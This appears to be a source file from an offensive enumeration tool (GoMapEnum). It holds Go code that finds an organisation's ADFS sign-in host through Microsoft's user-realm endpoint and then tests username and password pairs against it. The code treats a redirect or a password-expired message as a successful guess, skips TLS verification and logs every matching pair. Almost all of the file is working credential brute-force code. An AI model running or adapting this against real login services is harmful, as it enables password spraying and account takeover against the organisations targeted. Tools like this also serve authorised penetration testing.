package adfs

import (
	"GoMapEnum/src/utils"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var FIND_ADFS_URL = "https://login.microsoftonline.com/getuserrealm.srf?login=%s"
var ADFS_URL = "https://%s/adfs/ls/idpinitiatedsignon.aspx?client-request-id=%s&pullStatus=0"

func (options *Options) brute(username, password string) bool {
	if len(strings.Split(username, "\\")) == 1 && len(strings.Split(username, "@")) == 1 {
		log.Error("Only email format or Domain\\user are supported, skipping " + username)
		return false
	}
	uuid, _ := utils.NewUUID()
	adfsUrl := fmt.Sprintf(ADFS_URL, options.Target, uuid)
	client := &http.Client{
		// Not follow the redirect
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           options.Proxy,
		},
	}

	// Get the cookie MSISSamlRequest
	data := url.Values{}
	data.Set("SignInIdpSite", "SignInIdpSite")
	data.Set("SignInSubmit", "Sign in")
	data.Set("SingleSignOut", "SingleSignOut")
	req, _ := http.NewRequest("POST", adfsUrl, strings.NewReader(data.Encode()))
	req.Header.Add("User-Agent", utils.GetUserAgent())
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("Error while sending the request: " + err.Error())
	}

	// Authenticate
	data = url.Values{}
	data.Set("UserName", username)
	data.Set("Password", password)
	data.Set("AuthMethod", "FormsAuthentication")

	req, _ = http.NewRequest("POST", adfsUrl, strings.NewReader(data.Encode()))
	req.Header.Add("User-Agent", utils.GetUserAgent())
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Add("Cookie", "MSISSamlRequest="+resp.Cookies()[0].Value)
	resp, err = client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error while sending the request: " + err.Error())
	}
	log.Debug("Status code: " + strconv.Itoa(resp.StatusCode))
	// Parse the response to know if the password match
	if resp.StatusCode == 302 {
		log.Success(username + " and " + password + " matched")
		return true
	} else if strings.Contains(string(body), "Your password has expired") {
		log.Success(username + " and " + password + " matched but the password is expired")
		return true
	} else {
		log.Fail(username + " and " + password + " does not matched")
		return false
	}

}

// findTarget try to find the ADFS url
func (options *Options) findTarget(domain string) string {
	var target string
	url := fmt.Sprintf(FIND_ADFS_URL, domain)
	body, _, err := utils.GetBodyInWebsite(url, options.Proxy, nil)
	if err != nil {
		log.Error(err.Error())
		return ""
	}
	// Parse the response
	var userRealmResponse userRealm
	json.Unmarshal([]byte(body), &userRealmResponse)
	if userRealmResponse.NameSpaceType == "Unknown" {
		log.Error("Tenant " + domain + " not found")
		return ""
	} else if userRealmResponse.NameSpaceType == "Managed" {
		log.Error("Not ADFS found for " + domain)
		return ""
	}
	target = strings.Split(userRealmResponse.AuthURL, "/")[2]
	return target
}
